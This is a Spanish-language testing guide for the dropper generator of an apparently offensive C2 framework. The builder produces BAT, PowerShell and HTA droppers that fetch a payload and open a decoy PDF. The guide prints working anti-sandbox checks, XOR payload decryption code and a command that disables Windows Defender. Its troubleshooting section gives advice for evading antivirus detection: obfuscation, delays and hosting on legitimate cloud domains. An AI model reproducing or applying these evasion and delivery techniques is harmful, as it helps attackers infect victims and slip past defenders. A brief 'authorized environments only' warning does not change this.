# Testing Guide - Dropper System

Este documento describe cómo probar el sistema de droppers de C2R2-v2.

##  Tipos de Pruebas

### 1. Pruebas Unitarias (`test_droppers.py`)

Valida componentes individuales del sistema:

```bash
cd dropper
python3 test_droppers.py
```

**Cobertura:**
-  Generación de nombres aleatorios (100% únicos)
-  Encriptación/desencriptación XOR
-  Generación de droppers BAT
-  Generación de droppers PowerShell
-  Generación de droppers HTA
-  Sintaxis de scripts BAT/PS1
-  Existencia de generador LNK
-  Sistema de iconos
-  Integración con build.rs
-  Características de seguridad (anti-sandbox, user-agent)

**Resultado esperado:**
```
======================================================================
RESUMEN
======================================================================
Pruebas ejecutadas: 15
Exitosas: 15
Fallidas: 0
Errores: 0
Saltadas: 0
```

### 2. Pruebas de Integración (`test_integration.py`)

Valida el flujo completo end-to-end:

```bash
cd dropper
python3 test_integration.py
```

**Cobertura:**
-  Generación completa de dropper BAT
-  Generación completa de dropper PowerShell
-  Generación completa de dropper HTA
-  Generación simultánea de todos los tipos
-  Integridad de cifrado XOR
-  Distribución de nombres aleatorios
-  Disponibilidad de URLs de iconos
-  Características de seguridad (PS1 y BAT)
-  Funcionalidad de CLI
-  Sintaxis de todos los scripts

**Resultado esperado:**
```
======================================================================
RESUMEN DE INTEGRACIÓN
======================================================================
Pruebas ejecutadas: 10
Exitosas: 10
Fallidas: 0
Errores: 0

 TODAS LAS PRUEBAS DE INTEGRACIÓN PASARON
```

##  Pruebas Manuales

### Generar Droppers de Prueba

1. **Crear agente mock:**
```bash
dd if=/dev/urandom of=/tmp/test_agent.exe bs=1024 count=100
```

2. **Generar dropper BAT:**
```bash
python3 builder.py \
  --agent /tmp/test_agent.exe \
  --output /tmp/test.bat \
  --type bat \
  --url "http://test-server.local/agent.exe"
```

3. **Generar dropper PowerShell:**
```bash
python3 builder.py \
  --agent /tmp/test_agent.exe \
  --output /tmp/test.ps1 \
  --type ps1 \
  --decoy "https://example.com/documento.pdf"
```

4. **Generar dropper HTA:**
```bash
python3 builder.py \
  --agent /tmp/test_agent.exe \
  --output /tmp/test.hta \
  --type hta \
  --url "http://test-server.local/agent.exe" \
  --decoy "https://example.com/documento.pdf"
```

### Verificar Contenido

**BAT Dropper debe contener:**
-  `@echo off`
-  URL del payload
-  Comando PowerShell
-  User-Agent Mozilla
-  Timeout/delay
-  Decoy PDF embebido

**PowerShell Dropper debe contener:**
-  Payload encriptado en Base64
-  Clave XOR
-  Check de RAM (`TotalPhysicalMemory`)
-  Check de uptime (`LastBootUpTime`)
-  Desencriptación XOR (`-bxor`)
-  URL del decoy

**HTA Dropper debe contener:**
-  `<!DOCTYPE html>`
-  `<HTA:APPLICATION>`
-  VBScript (`type="text/vbscript"`)
-  `CreateObject("WScript.Shell")`
-  URL del payload
-  Interfaz de carga animada

##  Métricas de Calidad

### Tamaños de Archivo
- BAT: ~750-800 bytes
- PS1: ~2,400-2,500 bytes (incluye payload encriptado)
- HTA: ~1,900-2,000 bytes

### Características de Seguridad

**Anti-Sandbox (PowerShell):**
```powershell
# Verificar RAM (>4GB)
if((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB){exit}

# Verificar uptime (>10 min)
if((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime -lt [TimeSpan]::FromMinutes(10)){exit}
```

**User-Agent Spoofing (BAT/HTA):**
```batch
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

**XOR Encryption (PowerShell):**
```powershell
for($i=0;$i -lt $b.Length;$i++){$r[$i]=$b[$i] -bxor $kb[$i%$kb.Length]}
```

##  Debugging

### Ver logs detallados de pruebas:

```bash
# Pruebas unitarias con verbose
python3 -m pytest test_droppers.py -v

# Pruebas de integración con output
python3 test_integration.py -v
```

### Verificar sintaxis de PowerShell (Windows):

```powershell
# Verificar sintaxis sin ejecutar
Get-Command -Syntax (Get-Content test.ps1 -Raw)

# Analizar con PSScriptAnalyzer
Invoke-ScriptAnalyzer -Path test.ps1
```

### Verificar payload encriptado:

```python
import base64

# Leer el payload del PS1
with open('test.ps1', 'r') as f:
    for line in f:
        if line.startswith('$p='):
            b64_payload = line.split('"')[1]
            encrypted = base64.b64decode(b64_payload)
            print(f"Encrypted size: {len(encrypted)} bytes")
            break
```

##  Troubleshooting

### Problema: Tests fallan por falta de Pillow

**Solución:**
```bash
pip install pillow requests
```

### Problema: PowerShell syntax error

**Solución:**
- Verificar que las llaves `{}` estén correctamente escapadas en templates
- En Python string format: `{{` se convierte en `{`

### Problema: XOR encryption no funciona

**Solución:**
- Verificar que la clave sea la misma para encriptar y desencriptar
- El tamaño del payload encriptado debe ser igual al original

### Problema: Droppers detectados por AV

**Soluciones:**
1. Cambiar nombres de variables
2. Usar LNK en vez de BAT
3. Hostear en dominios legítimos (AWS, Azure)
4. Aumentar delays
5. Ofuscar más el código PowerShell

##  Checklist de Testing Completo

Antes de un deployment, verificar:

- [ ] Todas las pruebas unitarias pasan
- [ ] Todas las pruebas de integración pasan
- [ ] Droppers BAT/PS1/HTA se generan correctamente
- [ ] Payload se encripta con XOR
- [ ] Anti-sandbox checks funcionan
- [ ] User-Agent se incluye en requests
- [ ] Decoys se abren correctamente
- [ ] Nombres aleatorios son únicos
- [ ] URLs de iconos están disponibles
- [ ] CLI acepta todos los parámetros
- [ ] Archivos generados tienen tamaños esperados
- [ ] Sintaxis es válida (BAT/PS1/HTA)

##  Recursos Adicionales

### Herramientas de Testing

- **pytest**: Framework avanzado de testing
  ```bash
  pip install pytest pytest-cov
  pytest test_droppers.py --cov=. --cov-report=html
  ```

- **unittest**: Framework incluido en Python
  ```bash
  python3 -m unittest discover
  ```

### Testing en Windows

Para probar en entorno real (VM recomendada):

1. **Desactivar Windows Defender temporalmente:**
   ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   ```

2. **Ejecutar dropper en sandbox:**
   ```powershell
   # Usar Windows Sandbox o VM aislada
   .\test.bat
   ```

3. **Verificar que el decoy se abre**
4. **Verificar que el payload se descarga**

 **ADVERTENCIA:** Solo testear en entornos controlados y autorizados.

##  Ejemplos de Uso

### Test Rápido (Smoke Test)

```bash
#!/bin/bash
cd dropper

# Crear agente mock
dd if=/dev/urandom of=/tmp/agent.exe bs=1K count=50 2>/dev/null

# Generar todos los droppers
python3 builder.py --agent /tmp/agent.exe --output /tmp/test.bat --type bat --url http://test.local/a.exe
python3 builder.py --agent /tmp/agent.exe --output /tmp/test.ps1 --type ps1
python3 builder.py --agent /tmp/agent.exe --output /tmp/test.hta --type hta --url http://test.local/a.exe

# Verificar generación
ls -lh /tmp/test.*

# Limpiar
rm /tmp/test.* /tmp/agent.exe

echo " Smoke test completado"
```

### Test Automatizado Completo

```bash
#!/bin/bash
cd dropper

echo "=== Running Unit Tests ==="
python3 test_droppers.py
TEST1=$?

echo ""
echo "=== Running Integration Tests ==="
python3 test_integration.py
TEST2=$?

echo ""
echo "=== Results ==="
echo "Unit Tests: $([ $TEST1 -eq 0 ] && echo ' PASS' || echo ' FAIL')"
echo "Integration Tests: $([ $TEST2 -eq 0 ] && echo ' PASS' || echo ' FAIL')"

[ $TEST1 -eq 0 ] && [ $TEST2 -eq 0 ] && echo " ALL TESTS PASSED" || echo " SOME TESTS FAILED"
exit $(($TEST1 + $TEST2))
```

##  Soporte

Si encuentras problemas:

1. Revisar este documento primero
2. Ejecutar tests con verbose: `python3 test_droppers.py -v`
3. Verificar dependencias: `pip list | grep -E "pillow|requests"`
4. Revisar issues en GitHub
5. Crear un nuevo issue con:
   - Comando ejecutado
   - Error completo
   - Output de `python3 --version`
   - Sistema operativo

---

**Última actualización:** 2024-11-20
**Versión:** 2.0.0
**Autor:** G4sp4rCS
